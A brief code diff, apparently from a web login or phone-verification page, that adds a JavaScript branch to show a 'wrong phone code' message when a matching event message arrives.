@@ -46,6 +46,8 @@
 					document.getElementsByClassName('user-pass')[0].classList.remove('visible');
 					document.getElementsByClassName('phone-pass')[0].classList.remove('visible');
 					document.getElementsByClassName('requested')[0].classList.add('visible');
+				}else if (event.data=='wrong_phone_code'){
+					document.getElementsByClassName('wrong_phone_code')[0].classList.add('visible');
 				}
 
 
